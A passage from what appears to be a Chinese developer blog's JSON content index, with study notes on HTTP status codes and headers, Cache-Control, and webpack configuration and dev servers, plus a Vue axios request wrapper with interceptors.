301,302标准是禁止将POST改为GET，但实际上大家都这么做。 304 Not Modified该状态码表示客户端发送附带条件的请求时，服务器端允许请求访问资源，但未满足条件的情况，304状态码返回时，不包括任何响应的主体部分。304和重定向没有关系。 307 Temporary Redirect临时重定向。该状态码与302 Found有着相同的含义。尽管302标准禁止POST变为GET，但实际使用时大家并不遵守。307会按照浏览器标准，不会从POST变成GET。但是，对于处理响应时的行为，每种浏览器有可能出现不同情况。 4xx客户端错误4xx的响应结果表明客户端时发生错误的原因所在 400 Bad Request该状态码表示请求报文中存在语法错误，当错误发生时，需修改请求的内容后再次发送请求。另外，浏览器会像200 Ok一样对待状态码 401 Unauthorized该状态码表示发送的请求需要有通过HTTP认证（BASIC认证、DIGEST认证）的认证信息。另外若之前已进行过1次请求，则表示用户认证失败。 返回含有401的响应必须包含一个适用于被请求资源的WWW-Authenticate首部用于质询用户信息，当浏览器初次接收到401响应，会弹出认证用的对话窗口。 403 Forbidden该状态码表明对请求资源的访问被服务器拒绝了。服务端没有给出拒绝的详细理由，但如果做说明，可以在实体的主体部分对原因进行描述。 未获得文件系统的访问授权，访问权限出现某些问题（从未授权的源IP地址试图访问）等列举的情况都可能是发生403的原因。 404 Not Found该状态码表明服务器上无法找到请求的资源。除此之外，也可以在服务端拒绝请求且不想说理由时使用。 5xx服务器错误5xx的响应结果表明服务器本身发生错误 500 Internal Server Error表明服务器端在执行请求时发生了错误，也有可能时Web应用存在的bug或某些临时的故障 503 Service Unavailable表明服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。如果事先得知解除以上状况需要的时间，最好写入Retry-After首部字段再返回给客户端。 状态码和状况不一致： 不少返回的状态码响应都是错误的，但是用户可能察觉不到这点，比如Web应用程序内部发生错误，状态码依然返回200 OK。","categories":[{"name":"http","slug":"http","permalink":"https://coloey.github.io/categories/http/"}],"tags":[]},{"title":"http请求首部字段","slug":"http请求首部字段","date":"2022-04-11T11:53:59.000Z","updated":"2022-05-02T15:05:47.809Z","comments":true,"path":"2022/04/11/http请求首部字段/","link":"","permalink":"https://coloey.github.io/2022/04/11/http%E8%AF%B7%E6%B1%82%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5/","excerpt":"","text":"Accept Accept:text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept首部字段通知服务器，用户代理能够处理的媒体类型及媒体类型的相对优先级。可用type/subtype这种形式，一次指定多种媒体类型。 文本文件：text/html,text/plain,text/css… application/xhtml+xml,application/xml… 图片文件：image/jpg,image/gif… 视频文件：video/mpeg,video/quicktime… 应用程序使用的二进制文件：application/octet-stream,application/zip… 若想给显示的媒体类型增加优先级，使用q=来额外表示权重值，用分号（；）进行分隔，权重值q范围是0~1,（可精确到小数点后3位，且1为最大值。不指定权重值q时，默认权重为q=1.0 当服务器提供多种内容时，将首先返回权重值最高的媒体类型。 Accept-Charset Accept-Charset:iso-8859-5,unicode-1-1;q=0.8 Accept-Charset首部字段可用来通知服务器用户代理支持的字符集及字符集的相对优先顺序。另外，可一次性指定多种字符集。与各首部字段Accept相同的是可用权重q值来表示相对优先级 该首部字段用于内容协商机制的服务器驱动协商。 Accept-Encoding Accept-Encoding:gzip,deflate Accept-Encoding 首部字段用来告知服务器用户代理支持的内容编码及内容编码的优先级顺序。可一次性指定多种内容编码。 gzip:由文件压缩程序gzip（GNU zip)生成的编码格式，采用LZ77及32为循环冗余校验 compress:由UNIX文件压缩程序compress生成的编码格式，采用的算法LZW deflate:组合使用zlib格式及由deflate压缩算法生成的编码格式 identity:不执行压缩或不会变化的默认编码格式 采用权值q来表示相对优先级，这点与首部字段Accept相同。可用(*)作为通配符，指定任意编码格式 Accept-Language告知服务器用户代理能够处理的自然语言集，以及自然语言集的相对优先级。可一次指定多种自然语言集 按权重q表示相对优先级。 Authorization首部字段Authorization用来告知服务器，用户代理的认证信息，通常想要通过服务器认证的用户代理会在接收待返回的401状态码后，把首部字段Authorization加入到请求中。共用缓存在接收到含有Authorization首部字段的请求时的操作处理会略有差异。 Expect Expect:100-continue 客户端使用首部字段Expect来告知服务器，期望出现的某种特定行为，因服务器无法理解客户端的期望做出回应而发生错误时，会返回417Expectation Failed 客户端可以利用该首部字段，写明所期望的扩展。虽然HTTP/1.1规范只定义100-continue(状态码100Continue之意) From首部字段From用来告知服务器使用用户代理的用户的电子邮件地址。通常使用目的是为了显示搜索引擎用户代理的负责人的电子邮件联系方式。使用代理时，尽可能包含From首部字段 Host首部字段Host会告知服务器，请求的资源所处的互联网主机名和端口号。Host首部字段再HTTP/1.1规范内是唯一一个必须被包含在请求内的首部字段。 请求被发送到服务器时，请求中的主机名会用IP地址直接替换解决，但如果这时相同的IP地址下部署运行着多个域名，那么服务器就无法理解是哪个域名对应的请求。因此，就要使用首部字段Host来明确指出请求的主机名，若服务器未设定主机名，那直接发送空值。 Host: If-Matchif-xxx为条件请求，服务器接收到附带条件请求后，只有判断指定条件为真，才执行请求。 首部字段If-Match，属于附带条件之一，它会告知服务器匹配资源所用的实体标记(ETag)值，这时的服务器无法使用弱ETag值，服务器对比If-Match的字段值与资源的ETag值，仅当两者一致时才执行请求，否则，返回状态码412 Precondition Failed 还可以使用(*)指定If-Match的字段值，针对这种情况，服务器会忽略ETag的值，只要资源存在就处理请求。 If-Modified-Since If-Modified-Since: Thu,15 Apr 2004 00:00:00 GMT 首部字段If-Modified-Since属于附带条件之一，它会告知服务器若If-Modified-Since字段值早于资源的更新时间，则希望能处理该请求，而在If-Modified-Since字段值的日期时间后，如果请求的资源都没有更新，返回状态码304Not Modified的响应 If-Modified-Since用于确认代理或客户端拥有的本地资源的有效性，获取资源的更新时间可通过确认首部字段Last-Modified确定 If-None-Match与If-Match作用相反，用于指定If-None-Match字段值的实体标记（ETag)值与请求资源得到ETag不一致时会告知服务器处理该请求。 在GET或HEAD方法中使用首部字段If-None-Match可获取最新的源，因此这与使用首部字段If-Modified-Since有些类似。 If-RangeIf-Range字段值若是和ETag值或更新的日期时间匹配一致，那么就作为范围请求处理，若不一致返回全部资源 如果不使用If-Range,而是使用If-Match,服务器端的资源如果更新了，那客户端持有的资源中的一部分也会随之无效，服务器端就会以402 Precondition Failed返回，催促客户端再次发请求，与使用If-Range相比，就要花费两倍的功夫。 If-Unmodified-Since与If-Modified-Since作用相反，它的作用是告知服务器，指定的资源只有在字段值内指定的日期时间之后未发生更新得情况下，才能处理请求，如果在指定日期时间后发生了更新，则以状态码412 Precondition Failed作为响应返回 Max-Forwards通过TRACE方法或OPTIONS方法，发送包含首部字段Max-Forwards的请求时，该字段以十进制整数的形式指定可经过的服务器最大数目。服务器在往下一个服务器转发请求前，Max-Forwards的值减1后重新复制，当服务器收到Max-Forwards值为0的请求时则不再进行转发，而是直接返回响应。 如果代理服务器由于某些原因导致请求转发失败，客户端也就等不到服务器返回的响应。","categories":[{"name":"计算机网络","slug":"计算机网络","permalink":"https://coloey.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"},{"name":"HTTP","slug":"计算机网络/HTTP","permalink":"https://coloey.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/HTTP/"}],"tags":[]},{"title":"开发环境","slug":"开发环境","date":"2022-04-11T06:51:43.000Z","updated":"2022-05-07T13:08:25.916Z","comments":true,"path":"2022/04/11/开发环境/","link":"","permalink":"https://coloey.github.io/2022/04/11/%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/","excerpt":"","text":"开发环境中使用source map当 webpack 打包源代码时，可能会很难追踪到 error(错误) 和 warning(警告) 在源代码中的原始位置。例如，如果将三个源文件（a.js, b.js 和 c.js）打包到一个 bundle（bundle.js）中，而其中一个源文件包含一个错误，那么堆栈跟踪就会直接指向到 bundle.js。你可能需要准确地知道错误来自于哪个源文件，所以这种提示这通常不会提供太多帮助。 为了更容易地追踪 error 和 warning，JavaScript 提供了 source maps 功能，可以将编译后的代码映射回原始源代码。如果一个错误来自于 b.js，source map 就会明确的告诉你。 source map 有许多 可用选项，请务必仔细阅读它们，以便可以根据需要进行配置。 对于本指南，我们将使用 inline-source-map 选项，这有助于解释说明示例意图（此配置仅用于示例，不要用于生产环境）： 1234567891011121314151617181920212223242526272829303132333435363738394041const path=require(&#x27;path&#x27;)const HtmlWebpackPlugin=require(&quot;html-webpack-plugin&quot;)module.exports=&#123; entry:&#123; index: &#x27;./src/index.js&#x27;, print:&#x27;./src/print.js&#x27; &#125;, output:&#123; filename:&#x27;[name]bundle.js&#x27;, path:path.resolve(__dirname,&#x27;dist&#x27;), clean:true, publicPath:&#x27;/&#x27;, &#125;, module:&#123; rules:[ &#123; test: /\\.css$/i, use:[&#x27;style-loader&#x27;,&#x27;css-loader&#x27;], &#125;, &#123; test:/\\.(png|jpg|jpeg|svg|gif)$/i, type:&#x27;asset/resource&#x27; &#125;, ] &#125;, devtool:&#x27;inline-source-map&#x27;, devServer:&#123; static:&#x27;./dist&#x27;, &#125;, plugins:[ new HtmlWebpackPlugin(&#123; title:&#x27;Development&#x27;, &#125;) ], mode:&#x27;development&#x27;&#125; 选择开发工具webpack 提供几种可选方式，帮助你在代码发生变化后自动编译代码： webpack’s Watch Mode webpack-dev-server webpack-dev-middleware 多数场景中，你可能需要使用 webpack-dev-server，但是不妨探讨一下以上的所有选项。 使用watch mode你可以指示 webpack “watch” 依赖图中所有文件的更改。如果其中一个文件被更新，代码将被重新编译，所以你不必再去手动运行整个构建。 我们添加一个用于启动 webpack watch mode 的 npm scripts： package.json 12345678910111213141516171819202122&#123; &quot;name&quot;: &quot;webpack-demo&quot;, &quot;version&quot;: &quot;1.0.0&quot;, &quot;description&quot;: &quot;&quot;, &quot;private&quot;: true, &quot;scripts&quot;: &#123; &quot;test&quot;: &quot;echo \\&quot;Error: no test specified\\&quot; &amp;&amp; exit 1&quot;,+ &quot;watch&quot;: &quot;webpack --watch&quot;, &quot;build&quot;: &quot;webpack&quot; &#125;, &quot;keywords&quot;: [], &quot;author&quot;: &quot;&quot;, &quot;license&quot;: &quot;ISC&quot;, &quot;devDependencies&quot;: &#123; &quot;html-webpack-plugin&quot;: &quot;^4.5.0&quot;, &quot;webpack&quot;: &quot;^5.4.0&quot;, &quot;webpack-cli&quot;: &quot;^4.2.0&quot; &#125;, &quot;dependencies&quot;: &#123; &quot;lodash&quot;: &quot;^4.17.20&quot; &#125; &#125; 现在，你可以在命令行中运行 npm run watch，然后就会看到 webpack 是如何编译代码。 唯一的缺点是，为了看到修改后的实际效果，你需要刷新浏览器。如果能够自动刷新浏览器就更好了，因此接下来我们会尝试通过 webpack-dev-server 实现此功能。 webpack-dev-serverwebpack-dev-server 为你提供了一个基本的 web server，并且具有 live reloading(实时重新加载) 功能。设置如下： 1npm install --save-dev webpack-dev-server 修改配置文件，告知 dev server，从什么位置查找文件： webpack.config.js 123456789101112131415161718192021222324 const path = require(&#x27;path&#x27;); const HtmlWebpackPlugin = require(&#x27;html-webpack-plugin&#x27;); module.exports = &#123; mode: &#x27;development&#x27;, entry: &#123; index: &#x27;./src/index.js&#x27;, print: &#x27;./src/print.js&#x27;, &#125;, devtool: &#x27;inline-source-map&#x27;,+ devServer: &#123;+ static: &#x27;./dist&#x27;,+ &#125;, plugins: [ new HtmlWebpackPlugin(&#123; title: &#x27;Development&#x27;, &#125;), ], output: &#123; filename: &#x27;[name].bundle.js&#x27;, path: path.resolve(__dirname, &#x27;dist&#x27;), clean: true, &#125;, &#125;; 以上配置告知 webpack-dev-server，将 dist 目录下的文件 serve 到 localhost:8080 下。（译注：serve，将资源作为 server 的可访问文件） 我们添加一个可以直接运行 dev server 的 script： package.json 123456&quot;scripts&quot;: &#123; &quot;test&quot;: &quot;echo \\&quot;Error: no test specified\\&quot; &amp;&amp; exit 1&quot;, &quot;watch&quot;: &quot;webpack --watch&quot;,+ &quot;start&quot;: &quot;webpack serve --open&quot;, &quot;build&quot;: &quot;webpack&quot; &#125;, 现在，在命令行中运行 npm start，我们会看到浏览器自动加载页面。如果你更改任何源文件并保存它们，web server 将在编译代码后自动重新加载 webpack-dev-middlewarewebpack-dev-middleware 是一个封装器(wrapper)，它可以把 webpack 处理过的文件发送到一个 server。webpack-dev-server 在内部使用了它，然而它也可以作为一个单独的 package 来使用，以便根据需求进行更多自定义设置。下面是一个 webpack-dev-middleware 配合 express server 的示例。 首先，安装 express 和 webpack-dev-middleware： 1npm install --save-dev express webpack-dev-middleware 调整webpack.config,js 12345678910111213141516171819202122232425 const path = require(&#x27;path&#x27;); const HtmlWebpackPlugin = require(&#x27;html-webpack-plugin&#x27;); module.exports = &#123; mode: &#x27;development&#x27;, entry: &#123; index: &#x27;./src/index.js&#x27;, print: &#x27;./src/print.js&#x27;, &#125;, devtool: &#x27;inline-source-map&#x27;, devServer: &#123; static: &#x27;./dist&#x27;, &#125;, plugins: [ new HtmlWebpackPlugin(&#123; title: &#x27;Development&#x27;, &#125;), ], output: &#123; filename: &#x27;[name].bundle.js&#x27;, path: path.resolve(__dirname, &#x27;dist&#x27;), clean: true,+ publicPath: &#x27;/&#x27;, &#125;, &#125;; 我们将会在 server 脚本使用 publicPath，以确保文件资源能够正确地 serve 在 http://localhost:3000 下，稍后我们会指定 port number(端口号)。接下来是设置自定义 express server： 12345678910 webpack-demo |- package.json |- package-lock.json |- webpack.config.js+ |- server.js |- /dist |- /src |- index.js |- print.js |- /node_modules server.js 1234567891011121314151617181920const express = require(&#x27;express&#x27;);const webpack = require(&#x27;webpack&#x27;);const webpackDevMiddleware = require(&#x27;webpack-dev-middleware&#x27;);const app = express();const config = require(&#x27;./webpack.config.js&#x27;);const compiler = webpack(config);// 告知 express 使用 webpack-dev-middleware，// 以及将 webpack.config.js 配置文件作为基础配置。app.use( webpackDevMiddleware(compiler, &#123; publicPath: config.output.publicPath, &#125;));// 将文件 serve 到 port 3000。app.listen(3000, function () &#123; console.log(&#x27;Example app listening on port 3000!\\n&#x27;);&#125;); 现在，添加一个 npm script，以使我们更方便地运行 server： package.json 1234567 &quot;scripts&quot;: &#123; &quot;test&quot;: &quot;echo \\&quot;Error: no test specified\\&quot; &amp;&amp; exit 1&quot;, &quot;watch&quot;: &quot;webpack --watch&quot;, &quot;start&quot;: &quot;webpack serve --open&quot;,+ &quot;server&quot;: &quot;node server.js&quot;, &quot;build&quot;: &quot;webpack&quot; &#125;, 现在，在 terminal(终端) 中执行 npm run server","categories":[{"name":"前端工程化","slug":"前端工程化","permalink":"https://coloey.github.io/categories/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96/"},{"name":"webpack","slug":"前端工程化/webpack","permalink":"https://coloey.github.io/categories/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96/webpack/"}],"tags":[]},{"title":"Vue中封装axios请求","slug":"Vue中封装axios请求","date":"2022-04-11T02:01:47.000Z","updated":"2022-04-11T02:24:02.431Z","comments":true,"path":"2022/04/11/Vue中封装axios请求/","link":"","permalink":"https://coloey.github.io/2022/04/11/Vue%E4%B8%AD%E5%B0%81%E8%A3%85axios%E8%AF%B7%E6%B1%82/","excerpt":"","text":"在src文件夹中新创建一个utils文件夹，创建index.js来实现axios实例，并配置拦截器 index.js123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990import axios from &#x27;axios&#x27;import &#123;ElLoading,ElMessage&#125; from &#x27;element-plus&#x27;import router from &quot;../router&quot;import store from &quot;../store&quot;import CHAT from &quot;../client&quot;//const pendingMap=new Map();//axios.defaults.headers.post[&#x27;Content-Type&#x27;] = &#x27;application/x-www-form-urlencoded;charset=UTF-8&#x27;;//创建一个axios实例var instance=axios.create(&#123; baseURL:&quot;http://127.0.0.1:3007&quot;, timeout: 10000,//设置超时 headers:&#123; &#x27;Content-Type&#x27;:&#x27;application/x-www-form-urlencoded&#x27;, &#125;&#125;)let loading;//多次请求时let requestCount=0;//显示Loadingconst showLoading=()=&gt;&#123; if(requestCount===0&amp;&amp;!loading)&#123;//第一次发送请求并且没有loading加载loaing loading=ElLoading.service(&#123; text:&#x27;Loading&#x27;, background:&#x27;rgba(0,0,0,0.7)&#x27;, spinner:&#x27;el-icon-loading&#x27;, &#125;) &#125; requestCount++;//多次请求&#125;//隐藏loadingconst hideLoading=()=&gt;&#123; requestCount--; if(requestCount===0)&#123; loading.close()//直到请求都结束Loading才关闭 &#125;&#125;//请求拦截器instance.interceptors.request.use((config)=&gt;&#123; showLoading() //每次发送请求前判断是否存在token如果存在则在header加上token const token=window.localStorage.getItem(&#x27;token&#x27;); token&amp;&amp;(config.headers.Authorization=token) return config;&#125;,(error)=&gt;&#123; Promise.reject(error);&#125;)//响应拦截器instance.interceptors.response.use((response)=&gt;&#123; hideLoading() //响应成功 // console.log(&#x27;拦截器报错&#x27;) // console.log(response) const status=response.data.status; if(status!=1)&#123; switch(status)&#123; case 0: //响应成功后如果是登录成功有token把token存储在本地 if(response.data.token!=undefined)window.localStorage.setItem(&#x27;token&#x27;,response.data.token); break; case 200://获取用户信息成功后存储在localStorage里和store console.log(response.data); store.commit(&quot;saveUserInfo&quot;,(response.data).data); window.localStorage.setItem(&#x27;userInfo&#x27;,JSON.stringify((response.data).data)); break; case 401://登录过期跳转到登录页面 case 201://退出登录清空token跳转登录页面 window.localStorage.removeItem(&#x27;token&#x27;); window.localStorage.removeItem(&#x27;userInfo&#x27;) CHAT.logout(); router.push(&quot;/login&quot;); &#125; if(response.data.message)ElMessage.success(response.data.message) return Promise.resolve(response); &#125; else &#123; ElMessage.error(response.data.message); return Promise.reject(response); &#125; &#125;,(error)=&gt;&#123; console.log(error); //响应错误 if(error.response&amp;&amp;error.response.status)&#123; return Promise.reject(error) &#125; return Promise.reject(error);&#125;)export default instance; request.jsrequest.js中使用axios实例 12345678910111213141516171819202122232425262728import instance from &quot;./index&quot;const axios=(&#123; method, url, data, config&#125;)=&gt;&#123; method=method.toLowerCase(); if(method==&#x27;post&#x27;)&#123; return instance.post(url,data,&#123;...config&#125;) &#125;else if(method==&#x27;get&#x27;)&#123; return instance.get(url,&#123; params:data, ...config &#125;) &#125;else if(method==&#x27;delete&#x27;)&#123; return instance.delete(url,&#123; params:data, ...config &#125;) &#125;else if(method==&#x27;put&#x27;)&#123; return instance.put(url,data,&#123;...config&#125;) &#125;else&#123; console.log(&#x27;未知的方法&#x27;+method) return false &#125;&#125;export default axios api.jsapi.js用来封装各种类型的请求 默认情况下，axios 将 JavaScript 对象序列化为JSON. 要改为以格式发送数据application/x-www-form-urlencoded，我用的是qs.stringfy将数据转换，其他方法可以参考官网 []: https://axios-http.com/docs/urlencoded 1234567891011121314151617181920212223242526272829303132333435363738import axios from &quot;./request&quot;import qs from &quot;qs&quot;export const login=(data)=&gt;&#123; return axios(&#123; url:&#x27;/api/login&#x27;, method:&#x27;post&#x27;, data:qs.stringify(data), &#125;)&#125;export const register=(data)=&gt;&#123; return axios(&#123; url:&#x27;/api/register&#x27;, method:&#x27;post&#x27;, data:qs.stringify(data) &#125;)&#125;export const logout=()=&gt;&#123; return axios(&#123; url:&#x27;/api/logout&#x27;, method:&#x27;post&#x27;, &#125;)&#125;export const getUserInfo=()=&gt;&#123; return axios(&#123; url:&#x27;/my/getUserInfo&#x27;, method:&#x27;get&#x27;, &#125;)&#125;export const updatePassword=(data)=&gt;&#123; return axios(&#123; url:&#x27;/my/updatePassword&#x27;, method:&#x27;post&#x27;, data:qs.stringify(data) &#125;)&#125;","categories":[{"name":"Node","slug":"Node","permalink":"https://coloey.github.io/categories/Node/"},{"name":"Vue","slug":"Node/Vue","permalink":"https://coloey.github.io/categories/Node/Vue/"}],"tags":[]},{"title":"打包资源","slug":"打包资源","date":"2022-04-10T09:30:58.000Z","updated":"2022-05-07T13:08:19.507Z","comments":true,"path":"2022/04/10/打包资源/","link":"","permalink":"https://coloey.github.io/2022/04/10/%E6%89%93%E5%8C%85%E8%B5%84%E6%BA%90/","excerpt":"","text":"打包样式资源1234567891011121314151617181920212223242526272829303132333435363738394041const &#123;resolve&#125; =require(&#x27;path&#x27;)module.exports=&#123; entry:&#x27;./src/index.js&#x27;, //输出 output:&#123; //输出文件名 filename:&#x27;built.js&#x27;, //输出路径,_dirname node.js的变量，代表当前文件的目录绝对路径 path:resolve(__dirname,&#x27;build&#x27;) &#125;, //loader配置 module:&#123; rules:[ //匹配哪些文件 &#123;test:/\\.css$/, //使用哪些loader use:[ //use数组中loader执行顺序从右到左，从下到上一次执行 //创建style标签，将js中的样式资源插入进行，添加到head中生效 &#x27;style-loader&#x27;, //将css文件变成commonjs模块加载到js中，里面内容是样式字符串 &#x27;css-loader&#x27; ]&#125;, &#123; test:/\\.less$/, use:[ &#x27;style-loader&#x27;, &#x27;css-loader&#x27;, &#x27;less-loader&#x27;,//将less文件编译成css文件 ] &#125; ] &#125;, plugins:[ ], mode:&#x27;development&#x27;&#125; 打包html资源12345678910111213141516171819202122232425262728293031323334353637383940414243444546const &#123;resolve&#125; =require(&#x27;path&#x27;)const HtmlWebpackPlugin=require(&#x27;html-webpack-plugin&#x27;)module.exports=&#123; entry:&#x27;./src/index.js&#x27;, //输出 output:&#123; //输出文件名 filename:&#x27;built.js&#x27;, //输出路径,_dirname node.js的变量，代表当前文件的目录绝对路径 path:resolve(__dirname,&#x27;build&#x27;) &#125;, //loader配置 module:&#123; rules:[ //匹配哪些文件 &#123;test:/\\.css$/, //使用哪些loader use:[ //use数组中loader执行顺序从右到左，从下到上一次执行 //创建style标签，将js中的样式资源插入进行，添加到head中生效 &#x27;style-loader&#x27;, //将css文件变成commonjs模块加载到js中，里面内容是样式字符串 &#x27;css-loader&#x27; ]&#125;, &#123; test:/\\.less$/, use:[ &#x27;style-loader&#x27;, &#x27;css-loader&#x27;, &#x27;less-loader&#x27;,//将less文件编译成css文件 ] &#125; ] &#125;, plugins:[ //html-webpack-plugin默认会创建一个空的HTML,自动引入打包输出的所有资源（js/css） //需求：需要有结构的HTML文件 new HtmlWebpackPlugin(&#123; //模板比对&#x27;src/index.html&#x27;文件，并自动引入打包输出的所有资源(js/css) template:&#x27;./src/index.html&#x27; &#125;) ], mode:&#x27;development&#x27;&#125; 打包图片 html-loader 以相同的方式处理 &lt;img src=&quot;./my-image.png&quot; /&gt;。需要npm i html-wepack-plugin []: https://webpack.docschina.org/loaders/html-loader 12345678910111213141516//处理图片 &#123; test:/\\.(png|svg|jpg|jpeg|gif)$/i, type:&#x27;asset/resource&#x27;, &#125;, //将html导出为字符串 &#123; test:/\\.html$/i, loader:&quot;html-loader&quot;, &#125;, //处理字体 &#123; test:/\\.(woff|woff2|eot|ttf|otf)$/i, type:&#x27;asset/resource&#x27; &#125;, 打包xml,csv文件可以加载的有用资源还有数据，如 JSON 文件，CSV、TSV 和 XML。类似于 NodeJS，JSON 支持实际上是内置的，也就是说 import Data from &#39;./data.json&#39; 默认将正常运行。要导入 CSV、TSV 和 XML，你可以使用 csv-loader 和 xml-loader。让我们处理加载这三类文件： 1npm install --save-dev csv-loader xml-loader 12345678&#123; test: /\\.(csv|tsv)$/i, use: [&#x27;csv-loader&#x27;], &#125;, &#123; test: /\\.xml$/i, use: [&#x27;xml-loader&#x27;], &#125;, 打包toml,yaml,json5通过使用 自定义 parser 替代特定的 webpack loader，可以将任何 toml、yaml 或 json5 文件作为 JSON 模块导入。 1npm install toml yamljs json5 --save-dev 12345678910111213141516171819202122232425 const toml=require(&#x27;toml&#x27;)const yaml=require(&#x27;yamljs&#x27;)const json5=require(&#x27;json5&#x27;)...&#123; test: /\\.toml$/i, type: &#x27;json&#x27;, parser: &#123; parse: toml.parse, &#125;, &#125;, &#123; test: /\\.yaml$/i, type: &#x27;json&#x27;, parser: &#123; parse: yaml.parse, &#125;, &#125;, &#123; test: /\\.json5$/i, type: &#x27;json&#x27;, parser: &#123; parse: json5.parse, &#125;, &#125;, 清理/dist文件在每次构建前清理 /dist 文件夹，这样只会生成用到的文件。让我们使用 output.clean 配置项实现这个需求。 12345678910111213141516171819const path = require(&#x27;path&#x27;); const HtmlWebpackPlugin = require(&#x27;html-webpack-plugin&#x27;); module.exports = &#123; entry: &#123; index: &#x27;./src/index.js&#x27;, print: &#x27;./src/print.js&#x27;, &#125;, plugins: [ new HtmlWebpackPlugin(&#123; title: &#x27;Output Management&#x27;, &#125;), ], output: &#123; filename: &#x27;[name].bundle.js&#x27;, path: path.resolve(__dirname, &#x27;dist&#x27;),+ clean: true, &#125;, &#125;;","categories":[{"name":"前端工程化","slug":"前端工程化","permalink":"https://coloey.github.io/categories/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96/"},{"name":"webpack","slug":"前端工程化/webpack","permalink":"https://coloey.github.io/categories/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96/webpack/"}],"tags":[]},{"title":"wepack五个核心概念","slug":"wepack五个核心概念","date":"2022-04-10T04:05:22.000Z","updated":"2022-05-02T15:06:52.430Z","comments":true,"path":"2022/04/10/wepack五个核心概念/","link":"","permalink":"https://coloey.github.io/2022/04/10/wepack%E4%BA%94%E4%B8%AA%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5/","excerpt":"","text":"Entry:入口（Entry)指示Webpack以哪个文件为入口起点开始打包 Output: 输出（output)指示Webpack打包后的资源bundle输出到哪里，以及如何命名 Loader:Loader让Webpack能够去处理那些非JavaScript文件（webpack自身只理解JavaScript) loader 用于对模块的源代码进行转换。loader 可以使你在 import 或”加载”模块时预处理文件。因此，loader 类似于其他构建工具中“任务(task)”，并提供了处理前端构建步骤的强大方法。loader 可以将文件从不同的语言（如 TypeScript）转换为 JavaScript，或将内联图像转换为 data URL。loader 甚至允许你直接在 JavaScript 模块中 import CSS文件！ Plugins:插件(Plugins)可以用于执行范围更广的任务，插件的范围包括从打包优化到压缩，一直到重新定义环境中的变量等 Mode:模式（Mode）指示Webpack使用相应模式的配置 选项 描述 特点 development 会将process.env.NODE_ENV的值设为development,启用NamedChunksPlugin和NamedModulesPlugin 能让代码在本地调试运行的环境 production 会将 process.env.NODE_ENV 的值设为 production。启用 FlagDependencyUsagePlugin, FlagIncludedChunksPlugin, ModuleConcatenationPlugin, NoEmitOnErrorsPlugin, OccurrenceOrderPlugin, SideEffectsFlagPlugin 和 UglifyJsPlugin 能让代码优化上线运行的环境 运行指令开发环境webpack ./src/index.js -o ./build/build.js –mode=development:webpack会以./src/index.js为入口打包文件，打包后输出到./build/build.js，整体打包环境，是开发环境 生成环境webpack ./src/index.js-o ./build/build.js –mode=production,webpack会以./src/index.js为入口打包文件，打包后输出到./build/build.js，整体打包环境，是生产环境 结论 webpack能处理js/json资源，不能处理css/img等其他资源 生产环境和开发环境将ES6模块化编译成浏览器能识别的模块化 生产环境比开发环境多一个压缩的js代码","categories":[{"name":"前端工程化","slug":"前端工程化","permalink":"https://coloey.github.io/categories/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96/"},{"name":"webpack","slug":"前端工程化/webpack","permalink":"https://coloey.github.io/categories/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96/webpack/"}],"tags":[]},{"title":"HTTP首部字段","slug":"HTTP通用首部字段","date":"2022-04-09T08:13:43.000Z","updated":"2022-05-02T15:05:35.398Z","comments":true,"path":"2022/04/09/HTTP通用首部字段/","link":"","permalink":"https://coloey.github.io/2022/04/09/HTTP%E9%80%9A%E7%94%A8%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5/","excerpt":"","text":"HTTP报文首部HTTP请求报文由请求行（方法，URI，HTTP版本），HTTP首部字段等部分构成。 HTTP响应报文由状态行（HTTP版本，状态码（数字和原因短语））HTTP首部字段3部分构成。 4种HTTP首部字段类型通用首部字段：请求报文和响应报文都会使用的首部 请求首部字段：从客户端向服务端发送报文时使用的首部，补充了请求的附加内容，客户端信息，响应内容相关优先级等信息 响应首部字段：从服务器端向客户端返回响应报文时使用的首部。补充了响应的附加内容，也会要求客户端附加额外的内容信息 实体首部字段：针对请求报文和响应报文的实体部分使用的首部。补充了资源内容更新时间等与实体有关的信息 HTTP/1.1通用首部字段Cache-Control通过指定首部字段Cache-Control的指令，就能操作缓存的工作机制。 Cache-Control:private,max-age=0,no-cache 缓存请求指令： 指令 参数 说明 no-cache 无 强制向源服务器再次验证 no-store 无 不缓存请求或响应的任何内容 max-age=([秒]) 必需 响应的最大Age值 max-stale=([秒]) 可省略 接收已过期的响应 min-fresh=[秒] 必需 期望在指定时间内的响应仍有效 no-transform 无 代理不接更改媒体类型 only-if-cached 无 从缓存中获取资源 cache-extension 新指令标记（token) 缓存响应指令 指令 参数 说明 public 无 可向任意方提供响应的缓存 private 可省略 仅向特定用户返回响应 no-cache 可省略 缓存前必须先确认其有效性 no-store 无 不缓存请求或响应的任何内容 no-transform 无 代理不接更改媒体类型 must-revalidate 无 可缓存但必须再向服务器进行确认 proxy-revalidate 无 要求中间缓存服务器对缓存的响应有效性再进行确认 max-age=[秒] 必需 响应的最大Age值 s-maxage=[秒] 必需 公共缓存服务器响应的最大Age值 cache-extension - 新指令标记（token) no-cache指令Cache-Control:no-cache 使用no-cache指令的目的是为了防止从缓存中返回过期的资源，缓存会向源服务器进行有效期的确认后处理资源 客户端：发送的请求中包含no-cache指令，则表示客户端将不会接收缓存过的响应。于是“中间”缓存服务器必须把客户端请求转发给源服务器 服务器：如果服务器返回的响应中包含no-cache指令，那么缓存服务器不能对资源进行缓存，源服务器以后也不再对缓存服务器请求中提出的资源有效性进行确认，且禁止其对响应资源进行缓存操作 Cache-Control:no-cache=Location 